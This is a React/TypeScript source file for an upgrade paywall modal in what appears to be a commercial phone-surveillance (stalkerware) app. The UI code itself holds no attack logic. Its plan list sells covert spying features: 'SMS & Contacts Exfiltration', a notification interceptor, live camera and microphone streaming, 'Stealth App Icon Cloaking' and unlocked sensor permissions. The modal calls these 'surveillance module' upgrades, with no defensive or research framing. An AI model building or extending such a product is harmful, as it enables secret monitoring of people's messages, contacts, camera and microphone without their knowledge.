"use client";

import React from 'react';
import { Zap, Crown, Check, X, ArrowUpRight } from 'lucide-react';

interface UpgradeModalProps {
    isOpen: boolean;
    onClose: () => void;
    feature: string;
    requiredPlan: 'standard' | 'premium';
    onViewPlans?: () => void;
}

const planConfig = {
    standard: {
        name: 'Standard Tier',
        price: '$5',
        period: '/ year',
        accent: '#10b981',
        icon: Zap,
        features: [
            'Unlimited Photos & Videos',
            'SMS & Contacts Exfiltration',
            'Notification Interceptor',
            'Torch & Vibration Remote Pulse',
            'ZIP & Bulk Archive Download',
            'Up to 5 Paired Endpoints',
        ],
    },
    premium: {
        name: 'Premium VIP',
        price: '$10',
        period: '/ year',
        accent: '#f59e0b',
        icon: Crown,
        features: [
            'Everything in Standard',
            'Live HD Camera Streaming',
            'Live Mic Streaming & Audio Vault',
            'Stealth App Icon Cloaking',
            'Up to 10 Paired Endpoints',
            'All Sensor Permissions Unlocked',
        ],
    },
};

export default function UpgradeModal({ isOpen, onClose, feature, requiredPlan, onViewPlans }: UpgradeModalProps) {
    if (!isOpen) return null;
    const plan = planConfig[requiredPlan] || planConfig.standard;
    const isPremium = requiredPlan === 'premium';
    const Icon = plan.icon;

    return (
        <div 
            className="fixed inset-0 z-[700] flex items-center justify-center p-4 bg-black/85 backdrop-blur-md animate-in fade-in duration-100"
            onClick={onClose}
        >
            <div 
                className="relative w-full max-w-sm bg-[#0f1115] border border-white/15 rounded-3xl p-6 shadow-[0_25px_80px_rgba(0,0,0,0.98)] text-center animate-in zoom-in-95 duration-100"
                onClick={e => e.stopPropagation()}
            >
                {/* Close Button */}
                <button
                    onClick={onClose}
                    className="clay-button-sm absolute top-4 right-4 w-8 h-8 rounded-xl flex items-center justify-center text-white/50 hover:text-white transition-all cursor-pointer"
                >
                    <X size={14} />
                </button>

                {/* 3D Icon Pod */}
                <div 
                    className="w-16 h-16 rounded-3xl mx-auto mb-3 flex items-center justify-center border"
                    style={{
                        background: `${plan.accent}15`,
                        borderColor: `${plan.accent}40`,
                        color: plan.accent,
                        boxShadow: `0 0 25px ${plan.accent}30`
                    }}
                >
                    <Icon size={28} />
                </div>

                {/* Plan Tag */}
                <div 
                    className="inline-block text-[10px] font-mono font-black uppercase tracking-widest px-2.5 py-0.5 rounded-full border mb-2"
                    style={{
                        background: `${plan.accent}20`,
                        borderColor: `${plan.accent}50`,
                        color: plan.accent,
                    }}
                >
                    {plan.name} Required
                </div>

                {/* Feature Name */}
                <h2 className="text-base sm:text-lg font-black text-white tracking-tight mb-1">
                    {feature}
                </h2>
                <p className="text-xs text-white/40 font-mono mb-4">
                    Upgrade to unlock this surveillance module
                </p>

                {/* Features Checklist */}
                <div className="bg-[#14161b] border border-white/10 rounded-2xl p-4 mb-5 text-left">
                    <div className="text-[10px] font-mono font-black uppercase tracking-widest text-white/40 mb-2.5">
                        {plan.name} includes:
                    </div>
                    <div className="space-y-2">
                        {plan.features.map((f, i) => (
                            <div key={i} className="flex items-center gap-2">
                                <Check size={13} className="shrink-0" style={{ color: plan.accent }} strokeWidth={3} />
                                <span className="text-xs text-zinc-300 leading-tight">{f}</span>
                            </div>
                        ))}
                    </div>
                    <div className="mt-3.5 pt-3 border-t border-white/10 flex items-baseline justify-between">
                        <span className="text-[10px] font-mono uppercase text-white/40">Pricing</span>
                        <div className="flex items-baseline gap-1">
                            <span className="text-base font-black text-white font-mono">{plan.price}</span>
                            <span className="text-[10px] text-white/40 font-mono">{plan.period}</span>
                        </div>
                    </div>
                </div>

                {/* Buttons */}
                <div className="flex flex-col gap-2">
                    <button
                        type="button"
                        onClick={onViewPlans || onClose}
                        className="w-full py-3 rounded-2xl text-xs font-mono font-black uppercase tracking-wider transition-all flex items-center justify-center gap-1.5 shadow-lg active:scale-95 cursor-pointer"
                        style={{
                            background: plan.accent,
                            color: isPremium ? '#000' : '#000',
                            boxShadow: `0 0 20px ${plan.accent}50`,
                        }}
                    >
                        <span>View Plans & Upgrade</span>
                        <ArrowUpRight size={14} />
                    </button>
                    <button
                        type="button"
                        onClick={onClose}
                        className="py-2 text-[11px] font-mono text-white/40 hover:text-white transition-colors cursor-pointer"
                    >
                        Maybe later
                    </button>
                </div>
            </div>
        </div>
    );
}
